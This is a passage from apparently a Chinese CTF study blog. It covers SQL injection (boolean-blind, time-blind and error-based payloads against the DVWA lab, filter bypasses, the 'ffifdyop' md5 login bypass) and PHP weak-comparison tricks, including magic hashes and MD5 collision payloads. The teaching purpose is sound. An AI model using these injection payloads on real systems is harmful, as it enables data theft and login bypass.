<p>然后判断数据库名第二个字符ASCII是否大于97：1’and (ascii(substr(database(),2,1)))&gt;97#，最终确定ASCII为118，对应字符：v，同上步骤继续，最终确定当前数据库为：dvwa；</p>
<p>然后判断当前数据库中<strong>数据表的个数</strong>：1’and (select count(*) from information_schema.tables where table_schema=database())&gt;3#,这个步骤可以有也可以没有，看完下面就知道了；</p>
<p>然后判断当前数据库中第一个数据表的长度是否大于5：1’and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5#，结果如图：<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/70" alt="img"></p>
<p>limit子句用于限制查询结果返回的数量。</p>
<p><strong>用法</strong>：【select * from tableName limit i,n 】</p>
<p>参数：</p>
<ul>
<li>tableName : 为数据表；</li>
<li>i : 为查询结果的索引值（默认从0开始）；</li>
<li>n : 为查询结果返回的数量</li>
</ul>
<p>原理同上面判断数据库长度，最后得到当前数据库的第一个数据表名的长度，获取第二个表的长度：1’and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)&gt;5#，第三个，第四个以此类推，当第N个数据表长度大于0返回为假时，说明这个数据表不存在；</p>
<p>然后猜解当前数据库的第一个数据表的第一个字符的ASCII：1’and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97#，结果为103，对应字符：g；</p>
<p>然后猜解当前数据库的第一个数据表的第二个字符的ASCII：1’and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)))&gt;97#，结果为117，对应字符：u，</p>
<p>第三个，第四个字符以此类推直到猜解完毕；</p>
<p>然后猜解当前数据库中数据表users的列数：1’and (select count(*) from information_schema.columns where table_schema=database() and table_name=’users’)&gt;3#，同样，这个步骤也是可以省略的；</p>
<p>然后猜解当前数据库中数据表users的第一列的长度：1’and (select length(column_name) from information_schema.columns where table_name=’users’ limit 0,1)&gt;5#，当大于0为假，说明此列不存在；</p>
<p>然后猜解当前数据库数据表users的第一列字段的第一个字符：1’and (ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)))&gt;97#，然后依次猜解完全部字段。</p>
<h4 id="3常用函数"><a href="#3常用函数" class="headerlink" title="3常用函数"></a>3常用函数</h4><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163516499.png" alt="image-20220308163516499"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163726592.png" alt="image-20220308163726592"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163823741.png" alt="image-20220308163823741"></p>
<h2 id="0x08-基于时间的盲注"><a href="#0x08-基于时间的盲注" class="headerlink" title="0x08.基于时间的盲注"></a>0x08.基于时间的盲注</h2><p>基于时间的盲注和基于bool的盲注很相似，只不过基于时间的盲注用于不管执行的SQL语句正确与否，页面都不会给任何提示，因此无法使用bool盲注。基于时间的盲注经常用到的函数除了上面的还有延时函数sleep()，benchmark()  ,    if(c,a,b)，如果c为真执行a，否则执行b。</p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164044032.png" alt="image-20220308164044032"></p>
<p>猜解当前数据库名的长度，如果长度大于0就会延时5s：1’and if(length(database())&gt;0,sleep(5),0)#，如图：<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/70" alt="img"></p>
<p>然后猜解当前数据库中数据表的个数：1’and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(3),0)#；</p>
<p>然后猜解当前数据库中的第一个数据表的第一个字符的ASCII：1’and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97,sleep(3),0)#，同bool注入的步骤一样，只是注入语句有点差异，类比上面的语句即可猜解数所有数据。</p>
<h2 id="0x09-报错注入"><a href="#0x09-报错注入" class="headerlink" title="0x09 报错注入"></a>0x09 报错注入</h2><h3 id="floor："><a href="#floor：" class="headerlink" title="floor："></a>floor：</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163043347.png" alt="image-20220308163043347"></p>
<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml:"></a>updatexml:</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163120840.png" alt="image-20220308163120840"></p>
<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>kobe’ and extractvalue(0,concat(0x7e,database())) #</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp():"></a>exp():</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163207104.png" alt="image-20220308163207104"></p>
<p>?id=1’ and exp(~(select * from (select user())x))%23</p>
<h2 id="0x10-二次注入"><a href="#0x10-二次注入" class="headerlink" title="0x10 二次注入"></a>0x10 二次注入</h2><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164314139.png" alt="image-20220308164314139"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164347248.png" alt="image-20220308164347248"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164404811.png" alt="image-20220308164404811"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164651871.png" alt="image-20220308164651871"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164807879.png" alt="image-20220308164807879"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164836850.png" alt="image-20220308164836850"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164851469.png" alt="image-20220308164851469"></p>
<h2 id="0x11-绕过"><a href="#0x11-绕过" class="headerlink" title="0x11 绕过"></a>0x11 绕过</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165044761.png" alt="image-20220308165044761"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165125478.png" alt="image-20220308165125478"></p>
<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165233684.png" alt="image-20220308165233684"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165407344.png" alt="image-20220308165407344"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165421680.png" alt="image-20220308165421680"></p>
<p>%0c也可以绕过</p>
<h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165708693.png" alt="image-20220308165708693"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165728547.png" alt="image-20220308165728547"></p>
<h2 id="0x12-sql读写文件"><a href="#0x12-sql读写文件" class="headerlink" title="0x12 sql读写文件"></a>0x12 sql读写文件</h2><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165829448.png" alt="image-20220308165829448"></p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165917864.png" alt="image-20220308165917864"></p>
<h2 id="0x13-md5-str-true-类型绕过"><a href="#0x13-md5-str-true-类型绕过" class="headerlink" title="0x13 md5($str,true)类型绕过"></a>0x13 md5($str,true)类型绕过</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">md5</span><span class="params">(string,raw)</span></span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要计算的字符串。</td>
</tr>
<tr>
<td><em>raw</em></td>
<td>可选。规定十六进制或二进制输出格式：  TRUE - 原始 16 字符二进制格式    FALSE - 默认。32 字符十六进制数</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>SELECT * FROM admin WHERE pass = ‘“.md5($password,true).”‘“;<br>将密码转换成16进制的hex值以后，再将其转换成字符串后包含’ ‘or ’ 6’</p>
<p>SELECT * FROM admin WHERE pass=’ ‘or ’ 6’</p>
<p>很明显可以注入了。</p>
<p>难点就在如何寻找这样的字符串，网上有<br>提供两个字符串： ffifdyop、129581926211651571912466741651878684928<br>但题目有长度限制，所以输入ffifdyop即可获取flag</p>
<p>再转成字符串:’ ’ ‘or’ 6</p>
<p>解析:存在 or 即代码的两边有一边为真既可以绕过，其实为垃圾代码没有任何用的。</p>
<p>or 后面有6，非零值即为真。既可以成功绕过。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/28/PHP%E7%89%B9%E6%80%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/28/PHP%E7%89%B9%E6%80%A7/" class="post-title-link" itemprop="url">PHP特性</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-28 22:45:57" itemprop="dateCreated datePublished" datetime="2022-02-28T22:45:57+08:00">2022-02-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-03-05 16:07:57" itemprop="dateModified" datetime="2022-03-05T16:07:57+08:00">2022-03-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>3.5k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>3 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x01-intval-函数"><a href="#0x01-intval-函数" class="headerlink" title="0x01 intval()函数"></a>0x01 intval()函数</h2><p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220228230324623.png" alt="image-20220228230324623"></p>
<p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220228224931541.png" alt="image-20220228224931541"></p>
<p><strong>注意：</strong></p>
<p>这个函数在它的第二个参数是0和不放置参数的时候在科学计数法中有细微的区别</p>
<p>第二个参数设置0的时候，只要读到字符就会停止，不管他是不是科学计数法</p>
<p>第二个参数没设置的时候就不一样,他会正规的按照科学计数法</p>
<p>preg_match()函数一个漏洞 无法处理数组,通常是传一个数组进去，这样就会报错，从而返回false</p>
<p>$_GET[a]可以传数组a</p>
<p>strpos():查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p>
<p>strpos(<em>string,find,start</em>)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td><em>find</em></td>
<td>必需。规定要查找的字符。</td>
</tr>
<tr>
<td><em>start</em></td>
<td>可选。规定开始搜索的位置。</td>
</tr>
</tbody></table>
<h2 id="0x02-正则匹配"><a href="#0x02-正则匹配" class="headerlink" title="0x02 正则匹配"></a>0x02 正则匹配</h2><table>
<thead>
<tr>
<th align="left">修饰符：</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="left">i</td>
<td>ignore - 不区分大小写</td>
<td>将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td>
</tr>
<tr>
<td align="left">m</td>
<td>multi line - 多行匹配</td>
<td>使边界字符 ^ 和 $ 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。所有行只要有一行匹配到了就返回1</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>元字符</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td>
</tr>
<tr>
<td>$</td>
<td>匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td>
</tr>
</tbody></table>
<p>在默认状态下，一个字符串无论是否换行只有一个开始^和结尾$，如果采用多行匹配(加了m)，那么每一行都有一个^和结尾$。</p>
<p>^php      意思为以php开头<br> php$      意思是以php结尾</p>
<p> ^php$     意思是以php开头并以php结尾</p>
<h2 id="0x03-MD5"><a href="#0x03-MD5" class="headerlink" title="0x03 MD5"></a>0x03 MD5</h2><h3 id="1-常规的0e绕过"><a href="#1-常规的0e绕过" class="headerlink" title="1. 常规的0e绕过"></a>1. 常规的0e绕过</h3><ul>
<li>QNKCDZO</li>
<li>240610708</li>
<li>s878926199a</li>
<li>s155964671a</li>
<li>s214587387a</li>
<li>s214587387a</li>
</ul>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这些字符串的 <span class="built_in">md5</span> 值都是 <span class="number">0</span>e 开头，在 php 弱类型比较中判断为相等</span><br></pre></td></tr></table></figure>

<h3 id="2-数组绕过"><a href="#2-数组绕过" class="headerlink" title="2. 数组绕过"></a>2. <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&spm=1001.2101.3001.7020">数组</a>绕过</h3><p>如下代码</p>
<p>var_dump(md5($_GET[‘a’]) == md5($_GET[‘b’]))</p>
<p>传入：a[]=a&amp;b[]=b </p>
<p>虽然会报错，但是判断为真</p>
<p>MD5一个数组返回了null，null==null，也是强相等的，成功绕过</p>
<h3 id="3-强类型绕过-md5碰撞"><a href="#3-强类型绕过-md5碰撞" class="headerlink" title="3. 强类型绕过-md5碰撞"></a>3. 强类型绕过-md5碰撞</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="built_in">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="built_in">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br><span class="line">&amp;b<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br></pre></td></tr></table></figure>

<p>a与b区别：%00与%02</p>
<p>进行url解码后的MD5值相等</p>
<p>MD5(urldecode(a))===MD5(urldecode(b))</p>
<p>收录一些MD5值相等的字符串</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Param1=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span><span class="comment">;</span></span><br><span class="line">$Param2=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$data</span>1=<span class="string">&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;</span>;</span><br><span class="line"><span class="symbol">$data</span>2=<span class="string">&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="4-a-md5-a"><a href="#4-a-md5-a" class="headerlink" title="4. $a==md5($a)"></a>4. $a==md5($a)</h3><p><code>0e215962017</code> 的 MD5 值也是由 <strong>0e</strong> 开头，在PHP 弱类型比较中相等</p>
<h3 id="5-md5-与SQL注入"><a href="#5-md5-与SQL注入" class="headerlink" title="5. md5 与SQL注入"></a>5. md5 与SQL注入</h3><p>当 md5 函数的第二个参数为 true 时，返回为 字符串</p>
<p>一个特殊的 md5 值：ffifdyop<br><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220302215012765.png" alt="image-20220302215012765"><br>$a !== $b &amp;&amp; md5($a) === md5($b) &amp;&amp; sha1($a) === sha1($b)</p>
<p>利用 Exception 类中的 __toString() 方法返回的字符串相同，返回值只有第一个参数和行号可变，所以只要保持第一个参数相同且在同一行实例化，就能保证 a、b 作为字符串使用的时候相等，但是如果第二个参数（int）不同，他们作为对象比较时就不相等，可以满足上面的条件</p>
<p>php5：<br>php5 中不能直接执行变量 a、b，继续看 php7<br><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220302215038148.png" alt="image-20220302215038148"></p>
<p>php7：<br>php7 正常执行<br><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220302215050812.png" alt="image-20220302215050812"><br>php5中可以看作执行如下文件</p>
<?php
    exception 'Exception' with message 'phpinfo(); 
?>

<p>显然不是一个合法的 php 文件</p>
<p>继续看 php7</p>
<?php
    Exception:
        phpinfo();
      //goto Exception;

?>

<p>为了便于理解，我加了一个 goto 的注释，也就是说 Exception 被当作了标签，是合乎 php 语法的，可以被正常运行</p>
<h2 id="0x04-三目运算符-变量覆盖"><a href="#0x04-三目运算符-变量覆盖" class="headerlink" title="0x04 三目运算符+变量覆盖"></a>0x04 三目运算符+变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>; </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>; </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>; </span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&amp;是引用符号，意思是：不同的名字访问同一个变量内容。php的引用是在变量或者函数、对象等前面加上&amp;符号，PHP 的引用允许你用两个变量来指向同一个内容<br><strong>$_GET?$_GET=&amp;$_POST:’flag’</strong>;意思：如果有GET方法传参，就将GET方法改为POST方法</p>
<p>highlight_file($_GET[‘HTTP_FLAG’]==’flag’?$flag:<strong>FILE</strong>)意思：如果有通过GET方法传参’HTTP_FLAG=flag’，就highlight_file($flag)。否则highlight_file(<strong>FILE</strong>)</p>
<p>中间的代码没有作用，因为我们不提交 flag 参数</p>
<p>$_GET?$_GET=&amp;$_POST:’flag’;  //只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)<br>那么看最后要求$_GET[‘HTTP_FLAG’]==’flag’?$flag:__FILE__那么我们就可以直接随意get传参一个，然后post传参HTTP_FLAG=flag即可获得flag.</p>
<p>根据第一条可知，如果get传了一个值，那么就可以用post覆盖get中的值。<br>中间两行意义不大。<br>最后一行是,如果get传了一个HTTP_FLAG=flag就输出flag否则显示index.php源码。<br>所以我们get随便传一个，然后post传 HTTP_FLAG=flag即可<br>payload get：1=1 post：HTTP_FLAG=flag</p>
<h2 id="0x05-in-array"><a href="#0x05-in-array" class="headerlink" title="0x05 in_array()"></a>0x05 in_array()</h2><p>in_array() 函数搜索数组中是否存在指定的值。</p>
<p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220303140344464.png" alt="image-20220303140344464"></p>
<p>漏洞例子：</p>
<p> $array=[0,1,2,’3’];<br>  var_dump(in_array(‘a’, $array));            //bool(true)<br>  var_dump(in_array(‘1a’, $array));            //bool(true)<br>  var_dump(in_array(‘1’, $array, true));    //bool(false)</p>
<p>可以理解为，当type == false时，使用==进行比较；当type == true时，使用===进行比较。</p>
<h2 id="0x06-is-numeric"><a href="#0x06-is-numeric" class="headerlink" title="0x06 is_numeric()"></a>0x06 is_numeric()</h2><p>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE。</p>
<p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220303144548495.png" alt="image-20220303144548495"></p>
